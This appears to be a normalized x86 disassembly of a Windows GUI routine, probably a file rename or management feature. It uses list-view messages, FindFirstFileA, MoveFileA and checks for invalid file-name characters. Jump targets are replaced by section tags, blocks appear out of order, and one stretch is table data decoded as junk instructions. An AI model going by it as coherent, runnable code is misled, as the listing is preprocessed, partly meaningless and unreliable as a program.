mov esi [ esp + 0x1c8 ]
mov eax esi
mov [ esp + 0x64 ] 0xf
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x50 ] 0x0
lea edx [ eax + 0x1 ]
cmp [ esp + 0x10 ] edx
jne r-xdata
inc [ esp + 0x10 ]
add ebp 0x1c
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov edi [ esp + 0x10 ]
mov eax r--data
lea esi [ edi + 0xa8 ]
lea edx [ eax + 0x1 ]
mov edi edi
push edi
call sub_4207d0
add esp 0x4
mov eax esi
jmp r-xdata
mov eax [ esp + 0x1c8 ]
push eax
call sub_428c20
add esp 0x4
mov eax esi
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ esp + 0x54 ]
call sub_401e80
lea edx [ esp + 0x4c ]
push edx
mov ecx ebx
mov [ esp + 0x1c0 ] 0x0
call sub_407460
cmp [ esp + 0x64 ] 0x10
mov [ esp + 0x1bc ] 0xffffffff
jb r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax ebp
push eax
push edx
mov ecx edi
call sub_401e80
add esi 0x1c
add edi 0x1c
dec ebx
jne r-xdata
mov eax edx
lea ebp [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx esi
call sub_401e80
lea eax [ esp + 0x30 ]
push eax
call sub_420f60
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ esp + 0x38 ]
push ecx
lea ecx [ edi + 0xc4 ]
mov [ esp + 0x1c8 ] 0x2
call sub_401dd0
mov al [ esp + 0x1cc ]
test al al
mov edx [ esp + 0x1c4 ]
mov [ edi + 0x380 ] edx
je r-xdata
mov eax [ esp + 0x50 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ebp [ esp + 0x1c4 ]
lea ebp [ ebp + ebp * 2 ]
shl ebp 0x2
mov eax [ ebp + rw-data ]
test eax eax
lea ebx [ ebp + rw-data ]
mov [ esp + 0x14 ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
lea ecx [ edi + 0x54 ]
call sub_421150
push 0xffffffff
push 0x0
lea ecx [ esp + 0x38 ]
push ecx
mov ecx esi
call sub_401dd0
cmp [ edi + 0x34 ] 0x10
jb r-xdata
cmp eax [ ebp + rw-data ]
mov esi eax
mov [ esp + 0x18 ] esi
je r-xdata
mov eax [ eax ]
lea eax [ edi + 0x20 ]
mov eax [ edi + 0x20 ]
jmp r-xdata
cmp esi [ ebp + rw-data ]
je r-xdata
lea esp [ esp ]
mov eax [ esp + 0x94 ]
push eax
lea ecx [ edi + 0x8c ]
call sub_421150
push esi
call [ FindClose@IAT ]
lea edx [ esp + 0x74 ]
push edx
push eax
call [ FindFirstFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax [ esp + 0x1d4 ]
test eax eax
jne r-xdata
mov eax 0xfffffffc
xor ebx ebx
sub eax edi
lea esi [ edi + 0x4 ]
mov [ esp + 0x1c ] eax
mov edi edi
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov ecx [ esp + 0x1c4 ]
cmp ecx 0x2
jne r-xdata
push edi
call sub_406420
mov eax [ rw-data ]
add esp 0x4
cmp eax 0x1
jne r-xdata
inc ebx
add esi 0x1c
cmp ebx 0x20
jl r-xdata
mov ecx [ esi + 0x10 ]
test ecx ecx
jle r-xdata
mov [ esp + 0x18 ] esi
mov ecx [ esp + 0x14 ]
mov esi [ esi ]
mov eax [ ebp + rw-data ]
inc ecx
cmp esi eax
mov [ esp + 0x14 ] ecx
jne r-xdata
mov ecx [ esp + 0x1c8 ]
push ecx
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + rw-data ]
cmp eax [ ecx * 4 + rw-data ]
jb r-xdata
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x14 ] 0x0
jne r-xdata
mov eax [ esp + 0x1c8 ]
push eax
call sub_405da0
mov ecx eax
add esp 0x4
lea esi [ ecx + 0x1 ]
mov edi edi
cmp ebx 0x7
je r-xdata
mov eax [ esp + 0x1c4 ]
mov edx [ rw-data ]
mov ecx eax
or ecx 0x8
cmp edx ecx
jne r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ edx + 0x8 ]
add ecx eax
mov eax [ esi + 0x14 ]
add ecx esi
cmp eax 0x10
jb r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x34 ]
add eax 0x1c
cmp ecx 0x10
jb r-xdata
mov esi [ ebx + 0x4 ]
lea edx [ esp + 0x1c ]
mov [ esp + 0x14 ] eax
mov eax [ esi + 0x4 ]
push edx
push eax
push esi
mov ecx ebx
call sub_420cf0
push 0x1
mov ecx ebx
mov edi eax
call sub_420ff0
mov [ esi + 0x4 ] edi
mov ecx [ edi + 0x4 ]
mov [ ecx ] edi
push sub_4480e0
push 0x20
push 0x1c
push edi
call sub_4b6814
push edi
call j_sub_4b66ed#2
mov eax [ esp + 0x4c ]
add esp 0x4
cmp eax 0x10
jb r-xdata
mov edi [ eax ]
xor edi edi
jmp r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
push ecx
push eax
lea ecx [ edi + 0x230 ]
call sub_401e80
mov cl [ esp + 0x1d0 ]
test cl cl
je r-xdata
mov ebp [ esp + 0x10 ]
mov ebx eax
xor edi edi
shl ebx 0x4
mov edi esi
mov edi [ esi ]
jmp r-xdata
mov ecx [ ebp + rw-data ]
mov ebp [ esp + 0x1c4 ]
cmp ecx [ ebp * 4 + rw-data ]
jbe r-xdata
mov edx [ esp + 0x14 ]
push esi
mov [ rw-data ] esi
mov [ rw-data ] edx
call sub_429e00
mov eax [ rw-data ]
push eax
call j_sub_41d200
add esp 0x8
mov ecx [ esp + 0x34 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov al [ esp + 0x1d0 ]
test al al
mov esi [ esp + 0x10 ]
je r-xdata
mov edx [ edi + 0x4 ]
lea ecx [ esp + 0x1c ]
push ecx
push edx
push edi
mov ecx rw-data
call sub_420cf0
push 0x1
mov ecx rw-data
mov esi eax
call sub_420ff0
mov [ edi + 0x4 ] esi
mov eax [ esi + 0x4 ]
mov [ eax ] esi
jmp r-xdata
cmp [ esp + 0x1c4 ] 0x2
jne r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
mov [ eax * 4 + rw-data ] ecx
mov eax [ edx + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] ecx
push eax
mov eax [ ebx + rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ebp
push eax
push edi
call sub_401e80
mov eax [ esp + 0x1c ]
mov eax edi
lea ebp [ eax + 0x1 ]
lea ebx [ ebx ]
mov ecx [ rw-data ]
and ecx 0x7
cmp ecx ebp
jne r-xdata
cmp ebp 0x2
jne r-xdata
mov eax [ esp + 0x1d8 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
push ecx
push 0x0
push 0x2
call sub_4217f0
add esp 0xc
mov al [ esp + 0x1d0 ]
test al al
je r-xdata
mov eax [ ebx + rw-data ]
mov eax [ eax + edi * 4 ]
test eax eax
jne r-xdata
cmp edi eax
jge r-xdata
cmp ebp 0x3
jne r-xdata
mov edx [ esp + 0x14 ]
push 0x1
push esi
push edx
call sub_421220
add esp 0xc
mov eax [ ebx + 0x4 ]
xor edi edi
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov eax [ ecx + 0x4 ]
mov esi [ eax + 0x8 ]
add edi 0xfffffffe
cmp eax ecx
je r-xdata
mov esi [ esp + 0x10 ]
push sub_4480e0
push 0x20
push 0x1c
push esi
call sub_4b6814
push esi
call j_sub_4b66ed#2
mov eax [ esp + 0x4c ]
add esp 0x4
cmp eax 0x10
jb r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ edx + 0x8 ]
mov [ eax ] ecx
mov ebx [ esp + 0x1c4 ]
mov eax [ ebx * 4 + rw-data ]
mov esi [ InvalidateRect@IAT ]
lea ebx [ ebx * 4 + rw-data ]
xor edi edi
cmp eax edi
jl r-xdata
mov ecx [ esp + 0x18 ]
imul eax eax 0x1c
mov esi [ ecx + 0x8 ]
mov ecx [ eax + esi + 0x18 ]
add eax esi
cmp ecx edx
jb r-xdata
cmp [ ebp + 0x34 ] edx
jb r-xdata
push ebp
call sub_4207d0
push esi
call sub_428be0
jmp r-xdata
mov ecx [ ebx + 0x4 ]
test ecx ecx
mov esi [ eax + 0x8 ]
jne r-xdata
mov eax [ eax ]
mov edx [ rw-data ]
and edx 0x7
cmp edx ebp
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax ]
mov [ edx ] ecx
mov edx [ eax ]
mov ecx [ eax + 0x4 ]
push eax
mov [ edx + 0x4 ] ecx
call j_sub_4b66ed#2
mov eax [ rw-data ]
add esp 0x4
dec eax
mov [ rw-data ] eax
jmp r-xdata
mov edx [ esp + 0x34 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
mov [ ebx ] eax
mov edx [ ecx + 0x8 ]
lea ecx [ esp + 0x20 ]
push ecx
push eax
mov [ rw-data ] edx
mov edx [ rw-data ]
push 0x100e
push edx
mov [ rw-data ] eax
mov [ esp + 0x30 ] edi
call [ SendMessageA@IAT ]
mov ecx [ rw-data ]
push edi
lea eax [ esp + 0x24 ]
push eax
push ecx
call esi
mov edx [ rw-data ]
push edx
jmp r-xdata
lea edx [ esp + 0x20 ]
push edx
push eax
mov eax [ rw-data ]
push 0x100e
push eax
mov [ esp + 0x30 ] edi
call [ SendMessageA@IAT ]
mov edx [ rw-data ]
push edi
lea ecx [ esp + 0x24 ]
push ecx
push edx
call esi
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
lea esi [ ebp + 0x20 ]
mov esi [ ebp + 0x20 ]
jmp r-xdata
cmp [ esp + 0x48 ] 0x10
jb r-xdata
mov [ eax ] esi
mov eax [ esp + 0x1dc ]
add esp 0x4
test eax eax
je r-xdata
mov eax [ ecx ]
xor eax eax
jmp r-xdata
cmp ebp 0x3
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
call sub_429e00
mov eax [ rw-data ]
push eax
call j_sub_41d200
add esp 0x8
mov ecx [ ebx + rw-data ]
test ecx ecx
mov edx 0x10
jne r-xdata
mov ecx [ rw-data ]
lea edx [ esp + 0x4c ]
push edx
mov [ esp + 0x64 ] eax
mov eax [ esp + 0x18 ]
push eax
push 0x102e
push ecx
mov [ esp + 0x64 ] edi
call [ SendMessageA@IAT ]
inc edi
jmp r-xdata
lea eax [ ebp + 0x20 ]
push eax
call sub_457f40
add esp 0x4
add eax esi
jmp r-xdata
mov eax [ ebp + 0x20 ]
push eax
call sub_457f40
add esp 0x4
add eax esi
jmp r-xdata
cmp [ ebp + 0x34 ] edx
jb r-xdata
mov eax 0x1
mov eax [ esp + 0x34 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
dec [ esp + 0x14 ]
mov edx [ eax + 0x4 ]
mov ecx [ eax ]
mov [ edx ] ecx
mov edx [ eax ]
mov ecx [ eax + 0x4 ]
push eax
mov [ edx + 0x4 ] ecx
call j_sub_4b66ed#2
mov eax [ ebx + 0x8 ]
add esp 0x4
dec eax
mov [ ebx + 0x8 ] eax
cmp eax ecx
je r-xdata
mov eax [ esi + 0x380 ]
push eax
call sub_4207d0
add esp 0x4
push sub_4480e0
push 0x20
push 0x1c
push esi
call sub_4b6814
push esi
call j_sub_4b66ed#2
mov esi [ esp + 0x14 ]
add esp 0x4
push esi
call sub_42b540
add esp 0x4
call sub_428bd0
push 0x0
push edi
push 0x1008
push eax
call [ SendMessageA@IAT ]
sub_424560
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bfca7
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x3d0
sub eax 0x8
push ebx
mov ebx [ esp + 0x3e4 ]
push ebp
push esi
push edi
mov edi [ esp + 0x3f8 ]
je r-xdata
push 0xffffffeb
push ebx
call [ GetWindowLongA@IAT ]
mov ecx [ rw-data ]
mov edi [ SendMessageA@IAT ]
movzx edx ax
shr eax 0x10
mov esi eax
lea eax [ esp + 0xb0 ]
push eax
xor ebp ebp
push ebp
push 0x1005
push ecx
mov [ esp + 0xc0 ] 0x4
mov [ esp + 0xc4 ] edx
mov [ esp + 0xc8 ] esi
call edi
mov edx [ rw-data ]
mov ecx [ esp + 0xd0 ]
and edx 0x7
shl edx 0x4
mov eax [ edx + rw-data ]
mov esi [ eax + esi * 4 ]
mov [ esp + 0x2c ] ecx
mov [ esp + 0x84 ] esi
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] ebp
mov [ esp + 0x34 ] 0x0
cmp esi ebp
mov [ esp + 0x3e8 ] ebp
jne r-xdata
sub eax 0xf8
je r-xdata
mov eax esi
imul eax eax 0x1c
add eax ecx
cmp [ eax + 0x18 ] 0x10
jb r-xdata
cmp [ ecx + 0x34 ] 0x10
jb r-xdata
lea eax [ edi - 0x9 ]
cmp eax 0x1f
ja r-xdata
sub eax 0x2
jne r-xdata
lea edx [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
jmp r-xdata
lea ebp [ ecx + 0x20 ]
mov ebp [ ecx + 0x20 ]
jmp r-xdata
mov eax [ esp + 0x3fc ]
mov ecx [ esp + 0x3f4 ]
mov edx [ rw-data ]
push eax
push edi
push ecx
push ebx
push edx
call [ CallWindowProcA@IAT ]
movzx eax [ eax + lookup_table_424e60 ]
jmp [ eax * 4 + jump_table_424e54 ]
cmp edi 0x5c
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax ebp
push eax
push edx
mov eax edx
lea ebp [ eax + 0x1 ]
nop
add ecx 0x20
mov ecx [ ecx + 0x20 ]
jmp r-xdata
cmp [ ecx + 0x34 ] 0x10
jb r-xdata
mov ecx [ rw-data ]
push ecx
call [ SetFocus@IAT ]
xor eax eax
jmp r-xdata
mov edx [ esp + 0x3f0 ]
push 0xffffffeb
push edx
call [ GetWindowLongA@IAT ]
movzx ebp ax
shr eax 0x10
cmp edi 0x26
mov esi eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x2f
je r-xdata
sub eax ecx
push 0x0
push eax
lea ecx [ esp + 0x18 ]
call sub_4017f0
push 0xffffffff
push eax
lea ecx [ esp + 0x18 ]
call sub_401ba0
jmp r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx ebp
push ecx
push eax
jmp r-xdata
push ecx
call sub_457f40
add esp 0x4
add eax ebp
mov ecx eax
lea ebp [ ecx + 0x1 ]
mov ecx [ esp + 0x3e0 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x3dc
retn 0x10
cmp edi 0x28
jne r-xdata
dec ebp
jmp r-xdata
cmp edi 0x3a
je r-xdata
push eax
mov eax [ esp + 0x28 ]
inc eax
push eax
push 0xd
push ebx
call edi
cmp [ esp + 0x48 ] ebp
mov eax [ esp + 0x34 ]
jae r-xdata
lea eax [ esp + 0x14 ]
mov eax [ esp + 0x28 ]
mov ebp 0x10
cmp eax ebp
mov eax [ esp + 0x14 ]
jae r-xdata
lea ecx [ esp + 0x38 ]
call sub_401e80
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x14 ] 0x0
push 0x0
push 0x0
push 0xe
push ebx
mov [ esp + 0x3f8 ] 0x1
call edi
mov ecx [ esp + 0x24 ]
cmp eax ecx
ja r-xdata
push 0x10
call [ GetAsyncKeyState@IAT ]
test ah ah
mov edi [ rw-data ]
jns r-xdata
inc ebp
jmp r-xdata
test ebp ebp
jl r-xdata
cmp edi 0x2a
je r-xdata
mov ecx [ esp + 0x44 ]
mov edx [ esp + 0x24 ]
push ecx
push eax
push edx
push 0x0
lea ecx [ esp + 0x20 ]
call sub_401150
test eax eax
je r-xdata
lea eax [ esp + 0x34 ]
and edi 0x7
shl edi 0x4
lea ebx [ edi + rw-data ]
mov ecx ebx
inc esi
call sub_42c3a0
cmp esi eax
jl r-xdata
dec esi
jns r-xdata
push 0x0
call [ MessageBeep@IAT ]
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x1004
push edx
call edi
cmp ebp eax
jge r-xdata
cmp edi 0x3f
je r-xdata
mov eax [ rw-data ]
mov ebx [ esp + 0x3f0 ]
push eax
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
push ebx
call [ DestroyWindow@IAT ]
mov eax [ esp + 0x28 ]
xor edi edi
mov esi 0x10
cmp eax esi
mov [ rw-data ] edi
jb r-xdata
test esi esi
jne r-xdata
mov ecx [ edi + rw-data ]
cmp [ ecx + esi * 4 ] 0x1
jne r-xdata
xor esi esi
and edi 0x7
shl edi 0x4
mov eax [ edi + rw-data ]
cmp [ eax + esi * 4 ] 0x1
jne r-xdata
mov ecx edi
and ecx 0x7
shl ecx 0x4
add ecx rw-data
call sub_42c3a0
mov esi eax
dec esi
mov ecx [ rw-data ]
and ecx 0x7
shl ecx 0x4
add ecx rw-data
call sub_42c3a0
cmp esi eax
jge r-xdata
cmp edi 0x22
je r-xdata
cmp [ esp + 0x48 ] esi
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] edi
mov [ esp + 0x14 ] 0x0
jb r-xdata
mov ecx [ esp + 0x14 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
cmp esi 0x1
je r-xdata
mov edi [ esp + 0x24 ]
test edi edi
jne r-xdata
mov ecx ebx
call sub_42c3a0
cmp esi eax
jl r-xdata
inc esi
test esi esi
jge r-xdata
dec esi
mov eax [ rw-data ]
push eax
call [ SetFocus@IAT ]
mov ecx [ rw-data ]
push 0x0
push ebp
push 0x1013
push ecx
call edi
mov ecx [ rw-data ]
movzx edx si
or edx 0xffff8000
movzx eax bp
shl edx 0x10
or edx eax
push edx
push 0xf9
push 0x111
push ecx
call [ GetParent@IAT ]
push eax
call [ PostMessageA@IAT ]
xor eax eax
jmp r-xdata
cmp edi 0x3c
je r-xdata
mov edi [ esp + 0x3f8 ]
mov edx [ esp + 0x34 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x2c ]
mov ecx esi
imul ecx ecx 0x1c
lea edx [ esp + 0x10 ]
push edx
add ecx eax
call sub_4023a0
mov ebp 0x10
cmp [ esp + 0x28 ] ebp
mov ecx [ esp + 0x14 ]
jae r-xdata
push ebp
push r--data
push r--data
push ebx
call [ MessageBoxA@IAT ]
jmp r-xdata
test esi esi
xor esi esi
jmp r-xdata
jne r-xdata
lea ecx [ edi + rw-data ]
call sub_42c3a0
mov esi eax
dec esi
cmp edi 0x3e
je r-xdata
lea edx [ esp + 0x14 ]
mov [ esp + 0x9c ] edx
mov ecx [ esp + 0x14 ]
mov [ esp + 0x9c ] ecx
jmp r-xdata
xor ebp ebp
test edi edi
jle r-xdata
lea ecx [ esp + 0x14 ]
mov edx [ rw-data ]
lea ecx [ esp + 0x10 ]
push ecx
push ebp
push 0x1038
mov [ esp + 0x20 ] esi
mov [ esp + 0x1c ] 0x0
push edx
mov eax [ rw-data ]
lea edx [ esp + 0x10 ]
push edx
push ebp
push 0x100e
mov [ esp + 0x1c ] 0x2
push eax
jmp r-xdata
cmp edi 0x7c
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ esp + 0xb4 ]
mov edx [ rw-data ]
lea eax [ esp + 0x88 ]
push eax
push ecx
push 0x102e
push edx
call [ SendMessageA@IAT ]
cmp [ esp + 0x84 ] 0x4
jne r-xdata
mov [ esp + 0xa0 ] 0xf
mov [ esp + 0x9c ] 0x0
mov [ esp + 0x8c ] 0x0
mov edi [ esp + 0x2c ]
mov eax [ edi + 0x34 ]
add edi 0x1c
mov esi 0x10
cmp eax esi
mov [ esp + 0x3e8 ] 0x2
jb r-xdata
mov al [ ecx ]
mov dl al
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
mov edi [ SendMessageA@IAT ]
call edi
mov eax [ esp + 0x10 ]
mov ecx [ rw-data ]
push 0x0
push eax
push 0x1014
push ecx
call edi
push 0x0
push 0x0
push eax
call [ InvalidateRect@IAT ]
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
cmp al 0x5c
je r-xdata
inc ebp
inc ecx
jmp r-xdata
lea ebp [ edi + 0x4 ]
mov ebp [ edi + 0x4 ]
jmp r-xdata
cmp [ edi + 0x18 ] esi
jb r-xdata
push 0x10
push r--data
push r--data
push ebx
call [ MessageBoxA@IAT ]
jmp r-xdata
cmp al 0x2f
je r-xdata
inc ebp
inc ecx
cmp ebp edi
jl r-xdata
lea eax [ esp + 0x30 ]
push eax
lea ecx [ esp + 0x8c ]
push ecx
lea edx [ esp + 0x70 ]
push edx
call sub_420e80
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x98 ]
push ecx
lea edx [ esp + 0x60 ]
push edx
mov [ esp + 0x400 ] 0x3
call sub_420e80
add esp 0x18
cmp [ esp + 0x64 ] esi
mov ecx [ esp + 0x50 ]
mov [ esp + 0x3e8 ] 0x4
jae r-xdata
mov edi [ esp + 0x9c ]
mov eax 0x103
sub eax edi
push eax
lea ecx [ esp + 0x2e4 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0xc
push esi
push r--data
lea edx [ esp + 0x2e8 ]
push edx
push ebx
call [ MessageBoxA@IAT ]
lea ecx [ esp + 0x88 ]
call sub_4480e0
jmp r-xdata
push eax
call sub_457f40
add esp 0x4
push eax
push ebp
lea ecx [ esp + 0x90 ]
call sub_401e80
cmp [ esp + 0x24 ] 0x104
jbe r-xdata
cmp al 0x3a
je r-xdata
cmp [ esp + 0x80 ] esi
mov eax [ esp + 0x6c ]
jae r-xdata
lea ecx [ esp + 0x50 ]
cmp al 0x2a
je r-xdata
push ecx
push eax
call [ MoveFileA@IAT ]
cmp eax 0x1
jne r-xdata
lea eax [ esp + 0x6c ]
cmp al 0x3f
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
push 0xffffffff
push 0x0
lea eax [ esp + 0x54 ]
push eax
mov ecx edi
call sub_401dd0
xor ebx ebx
mov esi rw-data
mov ebp 0x10
cmp al 0x22
je r-xdata
cmp eax 0x2
mov eax [ esp + 0x48 ]
jne r-xdata
cmp [ esp + 0x28 ] esi
mov eax [ esp + 0x14 ]
jae r-xdata
add esi 0xc
inc ebx
cmp esi rw-data
jl r-xdata
mov al [ ebx + rw-data ]
test al al
jne r-xdata
cmp al 0x3c
je r-xdata
cmp eax esi
mov eax [ esp + 0x34 ]
jae r-xdata
cmp eax esi
mov eax [ esp + 0x34 ]
jae r-xdata
push eax
lea edx [ esp + 0xdc ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0xc
push esi
push r--data
lea eax [ esp + 0xe0 ]
push eax
jmp r-xdata
lea eax [ esp + 0x14 ]
mov ecx [ rw-data ]
and ecx 0x7
cmp ebx ecx
je r-xdata
cmp [ esp + 0x64 ] ebp
jb r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push 0x0
push ebx
call sub_4221d0
add esp 0x8
cmp al 0x3e
je r-xdata
push eax
lea eax [ esp + 0xdc ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
push esi
push r--data
lea ecx [ esp + 0xe0 ]
push ecx
lea eax [ esp + 0x34 ]
push eax
lea ecx [ esp + 0xdc ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0xc
push esi
push r--data
lea edx [ esp + 0xe0 ]
push edx
jmp r-xdata
lea eax [ esp + 0x34 ]
push 0x0
call [ MessageBoxA@IAT ]
lea ecx [ esp + 0x4c ]
call sub_4480e0
lea ecx [ esp + 0x68 ]
call sub_4480e0
lea ecx [ esp + 0x88 ]
call sub_4480e0
jmp r-xdata
mov eax [ esp + 0x80 ]
xor edi edi
cmp eax ebp
mov esi 0xf
mov [ esp + 0x64 ] esi
mov [ esp + 0x60 ] edi
mov [ esp + 0x50 ] 0x0
jb r-xdata
mov edx [ esp + 0x50 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov edi [ eax ]
xor edi edi
jmp r-xdata
cmp al 0x7c
je r-xdata
cmp [ esp + 0xa0 ] ebp
mov [ esp + 0x80 ] esi
mov [ esp + 0x7c ] edi
mov [ esp + 0x6c ] 0x0
jb r-xdata
mov eax [ esp + 0x6c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
jmp r-xdata
cmp edi [ esi ]
je r-xdata
mov eax [ esp + 0xb8 ]
mov [ esp + 0x90 ] eax
cmp [ esp + 0x28 ] ebp
jb r-xdata
mov ecx [ esp + 0x8c ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
jmp r-xdata
cmp [ esp + 0x80 ] ebp
mov ecx [ esp + 0x6c ]
jae r-xdata
mov eax [ edi + 0x8 ]
mov edx [ eax + 0x34 ]
add eax 0x1c
cmp edx ebp
jb r-xdata
lea ecx [ esp + 0x6c ]
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov edi [ edi ]
cmp edi [ esi ]
jne r-xdata
cmp [ esp + 0x64 ] ebp
mov edx [ esp + 0x50 ]
jae r-xdata
push ecx
push eax
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov eax edx
lea ebp [ eax + 0x1 ]
lea edx [ esp + 0x50 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ edi + 0x8 ]
sub eax ebp
push eax
push edx
add ecx 0x1c
call sub_401e80
mov ebp 0x10
sub_424e63
add al [ ecx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add [ edx ] al
add [ ecx ] ah
add [ eax ] al
add [ edx - 0x1 ] ch
push sub_4bfcec
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x3d8
cmp eax 0x111
push ebx
push ebp
push esi
push edi
je r-xdata
cmp [ esp + 0x400 ] 0x4
jne r-xdata
cmp eax 0x201
jne r-xdata
mov eax [ esp + 0x404 ]
mov ecx [ esp + 0x400 ]
mov edx [ esp + 0x3fc ]
push eax
mov eax [ esp + 0x3fc ]
push ecx
mov ecx [ rw-data ]
push edx
push eax
push ecx
call [ CallWindowProcA@IAT ]
mov eax [ esp + 0x400 ]
shr eax 0x10
movzx ecx ax
cmp ecx 0x9
jl r-xdata
mov ebx [ SendMessageA@IAT ]
mov edi [ GetCursorPos@IAT ]
mov ebp [ ScreenToClient@IAT ]
xor esi esi
mov [ esp + 0x18 ] esi
cmp ecx 0xa
jg r-xdata
inc esi
cmp esi 0x4
jl r-xdata
cmp ecx eax
jg r-xdata
mov ebp [ rw-data ]
test ebp ebp
je r-xdata
mov ecx [ rw-data ]
lea eax [ esp + 0x20 ]
push eax
push esi
push 0x130a
push ecx
call ebx
lea edx [ esp + 0x40 ]
push edx
call edi
mov ecx [ rw-data ]
lea eax [ esp + 0x40 ]
push eax
push ecx
call ebp
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x40 ]
lea edx [ eax - 0xc ]
cmp edx ecx
jg r-xdata
mov [ esp + 0x18 ] esi
jmp r-xdata
mov eax [ esp + 0x44 ]
cmp [ esp + 0x24 ] eax
jg r-xdata
dec ebp
cmp ax 0x9
mov [ esp + 0x1c ] ebp
jne r-xdata
cmp eax [ esp + 0x2c ]
jle r-xdata
mov edx [ esp + 0x1c ]
mov eax [ rw-data ]
lea ecx [ esp + 0x94 ]
push ecx
push edx
push 0x130a
push eax
call [ SendMessageA@IAT ]
mov esi [ esp + 0x3f8 ]
push 0x0
lea ecx [ esp + 0x98 ]
push ecx
push esi
mov [ rw-data ] 0x0
call [ InvalidateRect@IAT ]
push esi
call [ UpdateWindow@IAT ]
mov edx [ rw-data ]
push edx
call [ SetFocus@IAT ]
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x147
push edx
mov [ esp + 0x44 ] 0x0
call [ SendMessageA@IAT ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
push 0x0
push 0x0
push 0x146
push eax
mov [ esp + 0x28 ] esi
call ebx
test eax eax
jle r-xdata
mov edi ebp
shl edi 0x4
lea ebx [ edi + rw-data ]
mov ecx ebx
mov [ esp + 0x10 ] ebx
call sub_4010c0
lea ecx [ eax + 0x3 ]
cmp esi ecx
mov [ esp + 0x14 ] eax
jne r-xdata
mov esi [ esp + 0x28 ]
mov eax [ esp + 0x20 ]
mov edx [ rw-data ]
sub esi eax
push edx
sub esi 0x4
call [ GetDC@IAT ]
push 0x0
push 0x0
mov ebp eax
mov eax [ rw-data ]
push 0x31
push eax
mov [ esp + 0x20 ] ebp
call ebx
push eax
push ebp
call [ SelectObject@IAT ]
mov edi [ esp + 0x18 ]
shl edi 0x4
mov [ esp + 0x30 ] eax
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x34 ] edi
mov [ esp + 0x1c ] 0x0
lea ebx [ ebx ]
mov esi eax
jmp r-xdata
cmp esi eax
jne r-xdata
cmp [ ebp * 4 + rw-data ] 0xffffffff
je r-xdata
